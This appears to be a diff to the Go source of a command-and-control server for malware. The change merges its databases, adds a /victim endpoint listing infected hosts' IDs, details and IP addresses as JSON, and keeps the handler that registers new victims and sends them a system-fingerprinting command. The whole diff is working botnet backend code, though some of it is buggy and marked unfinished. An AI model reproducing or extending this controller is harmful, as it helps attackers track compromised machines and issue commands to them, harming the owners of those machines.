@@ -7,37 +7,49 @@ import (
 	"strings"
 	"net/http"
 	"database/sql"
+  "encoding/json"
 	"html/template"
 	"encoding/base64"
 	_ "github.com/mattn/go-sqlite3"
 )
 
-var victim *sql.DB
-var logs *sql.DB
+var db *sql.DB
 var err error
+
+type VictimsResponse struct {
+  Uid int
+  Details string
+  Ip string
+}
 
 type ValueResponse struct {
   All string
 }
 
+func errorStatment(err error) {
+	if err != nil {
+                log.Fatal("error:", err)
+        }
+}
+
 func saveResponse(x []byte) bool{
 	value := strings.Split(string(x), "==")
 	fmt.Print("Valor: %s\n", value)
-	err = victim.QueryRow("SELECT uid FROM victims WHERE uid = ?", value[0]).Scan(&value[0])
+	err = db.QueryRow("SELECT uid FROM victims WHERE uid = ?", value[0]).Scan(&value[0])
 	fmt.Print(err)
 	if err != nil {
     // Create
 		// detais==ip
-		addVictim, err := victim.Prepare("INSERT INTO victims (details, ip, created) VALUES (?, ?, datetime('now', 'localtime'))")
+		addVictim, err := db.Prepare("INSERT INTO victims (details, ip, created) VALUES (?, ?, datetime('now', 'localtime'))")
 		addVictim.Exec(value[0], value[1])
 		fmt.Print("New vicitm: %s\n", addVictim)
 		errorStatment(err)
 		return true
 	} else {
-    // Update
+    // Update FIX IT
     // user id (of controller)==respose==status
-		status, err := logs.Prepare("INSERT INTO logs (uid, response, status) VALUES (?, ?, ?)")
-    status.Exec(value[0], value[1], value[2])
+		status, err := db.Prepare("UPDATE command SET response = ? and status = ? WHERE uid = ?")
+    status.Exec(value[1], value[2], value[0])
     fmt.Print("New command: %s\n", status)
     errorStatment(err)
 		return false
@@ -48,14 +60,25 @@ func queryCommand(x []byte) string {
   return "Query db for command"
 }
 
-func errorStatment(err error) {
-	if err != nil {
-                log.Fatal("error:", err)
-        }
-}
-
 func pageAPI(w http.ResponseWriter, r *http.Request) {
-	fmt.Fprintf(w, "API here")
+  rows, err := db.Query("SELECT uid, details, ip from victims ORDER BY uid DESC");
+  errorStatment(err)
+
+  var response []*VictimsResponse
+
+  for rows.Next() {
+    value := new(VictimsResponse)
+    err = rows.Scan(&value.Uid, &value.Details, &value.Ip)
+    errorStatment(err)
+
+    response = append(response, value)
+  }
+  w.Header().Set("Content-Type", "application/json; charset=UTF-8")
+  if err := json.NewEncoder(w).Encode(response); err != nil {
+    panic(err)
+  }
+
+  rows.Close()
 }
 
 func proccessData(w http.ResponseWriter, r *http.Request) {
@@ -66,7 +89,7 @@ func proccessData(w http.ResponseWriter, r *http.Request) {
 
   if saveResponse(value) {
     // Record
-    err = victim.QueryRow("SELECT uid FROM victims ORDER BY uid DESC LIMIT 1").Scan(&number)
+    err = db.QueryRow("SELECT uid FROM victims ORDER BY uid DESC LIMIT 1").Scan(&number)
     command = "grep 'PRETTY_NAME' /etc/os-release"
   } else {
     // Found
@@ -82,16 +105,10 @@ func proccessData(w http.ResponseWriter, r *http.Request) {
  }
 
 func main() {
-	/*command, err := sql.Open("sqlite3", "./database/commands.db")
-	errorStatment(err)*/
-	// Default request from base64
-	// id-database==response==status
-	victim, err = sql.Open("sqlite3", "./database/victims.db")
-	errorStatment(err)
-	logs, err = sql.Open("sqlite3", "./database/logs.db")
+	db, err = sql.Open("sqlite3", "./database/data.db")
 	errorStatment(err)
 
   http.HandleFunc("/", proccessData)
-	http.HandleFunc("/auth", pageAPI)
+	http.HandleFunc("/victim", pageAPI)
 	log.Fatal(http.ListenAndServe(":8080", nil))
 }
